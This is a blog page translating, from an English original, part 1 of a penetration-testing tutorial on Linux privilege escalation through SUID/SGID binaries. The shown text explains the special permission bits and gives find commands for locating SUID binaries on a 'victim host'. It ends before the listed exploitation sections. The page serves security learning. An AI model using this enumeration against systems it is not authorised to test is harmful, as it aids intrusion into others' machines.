<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-SUID_SGID_1" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-SUID_SGID_1 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-SUID_SGID_1 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 SUID | SGID Part-1 – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 SUID | SGID Part-1 – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.bd0a5f0e.css">
<script src="/web/assets/js/runtime~main.224207a9.js" defer="defer"></script>
<script src="/web/assets/js/main.e046f592.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/渗透">渗透</a><button aria-label="折叠侧边栏分类 &#x27;渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Capabilities">Linux 提权-Capabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Cron Jobs">Linux 提权-Cron Jobs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Docker 容器">Linux 提权-Docker 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-LXD 容器">Linux 提权-LXD 容器</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-MySQL UDF">Linux 提权-MySQL UDF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-NFS 共享">Linux 提权-NFS 共享</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1">Linux 提权-SUID_SGID_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_2">Linux 提权-SUID_SGID_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1">Linux 提权-Sudo_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_2">Linux 提权-Sudo_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-内核利用">Linux 提权-内核利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权指南">Linux 提权指南</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">Linux</a><button aria-label="展开侧边栏分类 &#x27;Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">Windows</a><button aria-label="展开侧边栏分类 &#x27;Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/渗透"><span itemprop="name">渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-SUID_SGID_1</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-SUID_SGID_1</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/suid-sgid-lpe/" target="_blank" rel="noopener noreferrer">SUID | SGID Part-1 – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 了解特殊权限</a></li>
<li><a href="#id2">2 寻找 SUID/SGID 二进制文件 – 手动方法</a>
<ul>
<li><a href="#id2.1">2.1 枚举 SUID 二进制文件</a></li>
<li><a href="#id2.2">2.2 枚举 SGID 二进制文件</a></li>
</ul>
</li>
<li><a href="#id3">3 寻找 SUID/SGID 二进制文件 – 自动工具</a>
<ul>
<li><a href="#id3.1">3.1 枚举 SUID/SGID 二进制文件 – LinPEAS</a>
<ul>
<li><a href="#id3.1.1">3.1.1 枚举 SUID 二进制文件</a></li>
<li><a href="#id3.1.2">3.1.2 枚举 SGID 二进制文件</a></li>
</ul>
</li>
<li><a href="#id3.2">3.2 枚举 SUID 二进制文件 – SUID3NUM</a>
<ul>
<li><a href="#id3.2.1">3.2.1 下载并执行 SUID3NUM</a></li>
<li><a href="#id3.2.2">3.2.2 回顾调查结果</a></li>
<li><a href="#id3.2.3">3.2.3 将 AutoPwn 开关拨至 ON</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id4">4 利用 SUID 二进制文件 – GTFOBins</a>
<ul>
<li><a href="#id4.1">4.1 利用 Easy Shell 二进制文件 – env/find</a></li>
<li><a href="#id4.2">4.2 利用文件读/写二进制文件 – tail/nano</a>
<ul>
<li><a href="#id4.2.1">4.2.1 读取敏感文件 – tail</a></li>
<li><a href="#id4.2.2">4.2.2 写入敏感文件 – nano</a></li>
</ul>
</li>
<li><a href="#id4.3">4.3 利用一些需要创造力的二进制文件 – cp/wget</a>
<ul>
<li><a href="#id4.3.1">4.3.1 将 SUID 权限注入 bash – cp</a></li>
<li><a href="#id4.3.2">4.3.2 下载新的 passwd 文件 – wget</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id5">5 最后的想法</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇由两部分组成的关于 Linux 权限升级的文章中，我们将探讨如何滥用开启了 SUID 和/或 SGID 位的二进制文件。</p>
<blockquote>
<p>这篇文章比我最初预想的要长得多，所以我不得不将其分成<strong>两部分</strong>。</p>
</blockquote>
<p>在第 1 部分中，我们将首先学习如何手动枚举 SUID 和 SGID 二进制文件以及如何使用两个不同的工具：LinPEAS 和 SUID3NUM。</p>
<p>在枚举阶段，我们将在受害主机上发现总共十个易受攻击的 SUID 二进制文件。在这十个二进制文件中，我们将发现其中六个是标准二进制文件（即常见的命令），另外四个是自定义二进制文件（即个人制作的命令）。</p>
<p>在枚举系统上所有 SUID 二进制文件之后，我们将通过一个名为 <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFObins</a> 的强大网站来利用这六个标准二进制文件。</p>
<p>一旦我们完成了对标准二进制文件的利用，我们将把重点转移到自定义二进制文件上。但是，这将在本文的第 2 部分中介绍。</p>
<p>让我们开始吧！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1了解特殊权限"><strong><div id="id1">1、了解特殊权限</div></strong><a href="#1了解特殊权限" class="hash-link" aria-label="1了解特殊权限的直接链接" title="1了解特殊权限的直接链接">​</a></h2>
<p>SUID 和 SGID 被称为“特殊权限”，因为它们允许在标准权限位之上拥有额外的特权。</p>
<p>在 Linux 中，有 3 个权限集：所有者、群组和其它人。每个权限集的标准权限位是 RWX – 读取、写入和执行。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625987-1589588071-d1fb408fc101fbd8148b90817654622f.png" width="660" height="386" class="img_ev3q"></p>
<p>当我们执行 ls -l 命令时，可以看到权限以及文件所有者和所属群组。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190627109-2061226107-0b16802c7e2526204ea9d3146a485f52.png" width="397" height="78" class="img_ev3q"></p>
<blockquote>
<p>要了解权限如何运作的更深入解释，请<a href="https://juggernaut-sec.com/weak-file-permissions/#How_Permissions_Work_in_Linux" target="_blank" rel="noopener noreferrer" title="这里">在此处</a>查看我关于弱文件权限的权限提升帖子。</p>
</blockquote>
<p>除了三个标准权限位之外，还有三个特殊权限位：SUID、SGID 和 Sticky。</p>
<p>这些特殊权限只能存在于各自的集合中。我的意思是，SUID 仅适用于所有者集，SGID 仅适用于群组集，Sticky 仅适用于其他人集。此外，当其中任何一个被启用时，它们总是会替换 x 位。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190625487-560421598-96234df3e2fc74c64f1a03ccfbc14028.png" width="389" height="78" class="img_ev3q"></p>
<p>在上图中，我们可以看到 <strong>test.c</strong> 文件已经启用了所有的特殊权限。另外，背景是红色的，因为设置了 SUID 位，红色就是 SUID 的表示方式。</p>
<p>SUID 和 SGID 分别具有红色和黄色背景。Sticky 则没有背景颜色。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626392-242085344-acb42b9be15564ce7188eee8adaae203.png" width="390" height="301" class="img_ev3q"></p>
<p>另外，如果启用了特殊权限位的权限集中没有 x 权限，那么他们将在各自的集合中用大写“S”（SUID / SGID）或大写“T”（Sticky）表示。</p>
<p>现在我们已经了解特殊位是如何表示的，让我们再仔细看看 SUID 和 SGID 位，从 SUID 开始。</p>
<blockquote>
<p>注：原文关于SUID、SGID、Sticky 三小节的描述，个人感觉有些啰嗦且关于 SGID 的描述不太认可，故此处已删除。</p>
<p>有关 SUID/SGID 特权在功能方面的差异，可看我的实践实验 <a href="https://www.cnblogs.com/kqdssheng/p/18279458" target="_blank" rel="noopener noreferrer">Linux 特权 SUID/SGID 的详解</a>。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2寻找-suidsgid-二进制文件---手动方法"><strong><div id="id2">2、寻找 SUID/SGID 二进制文件 - 手动方法</div></strong><a href="#2寻找-suidsgid-二进制文件---手动方法" class="hash-link" aria-label="2寻找-suidsgid-二进制文件---手动方法的直接链接" title="2寻找-suidsgid-二进制文件---手动方法的直接链接">​</a></h2>
<p>对于本文中的所有示例，我们假设已掌握用户 “user” 的登录信息，且可通过 SSH 对其进行访问。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190624734-1646191307-b1004f2af132786d1b8b75e811934f80.png" width="552" height="331" class="img_ev3q"></p>
<blockquote>
<p>因为能够通过 SSH 获得立足点，所以我们已经拥有完整的 TTY ，因此就不需要再进行终端升级。</p>
</blockquote>
<p>此外，在接下来的所有示例中，我们将重点关注 SUID 位。不过，我们将学习如何同时获取 SUID/SGID 二进制文件。</p>
<p>我们要利用的所有二进制文件都归 root<!-- -->:root<!-- --> 所有，因此无论如何，如果我们发现 SUID 位或 SGID 位被打开，那么二进制文件就会拥有或获得 root 的身份或援助。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21枚举-suid-二进制文件"><strong><div id="id2.1">2.1、枚举 SUID 二进制文件</div></strong><a href="#21枚举-suid-二进制文件" class="hash-link" aria-label="21枚举-suid-二进制文件的直接链接" title="21枚举-suid-二进制文件的直接链接">​</a></h4>
<p>要查找系统中的所有 SUID 文件，我们可以通过以下 find 命令去获得：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -4000 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -u=s 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626436-461314479-ddb8c12ee28d59810b85a13b43516124.png" width="529" height="559" class="img_ev3q"></p>
<p>我们马上就能看到很多的 SUID 二进制文件，但这并不意味着它们都是我们感兴趣的。</p>
<p>这些二进制文件大多是默认的 SUID 二进制文件，无法被利用，因此要知道哪些是<strong>默认的，哪些是有趣的或自定义的</strong>很关键。</p>
<p>乍一看，我们可以看到一些有趣的二进制文件，例如 <strong>cp</strong> 和 <strong>nano</strong>，以及一些自定义二进制文件，包括 <strong>suid-path、suid-so、suid-sf</strong>。</p>
<p>我们还可以改进此搜索，以仅搜索 root 拥有的 SUID 二进制文件。我们还可以添加 <strong>-ls</strong> 标志来查看文件权限。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -4000 -user root -ls 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find / -type f -perm -u=s -user root -ls 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240705190626930-542872236-5e1fb23609d1a112ae5f6fc8b2c623e1.png" width="1024" height="586" class="img_ev3q"></p>
<blockquote>
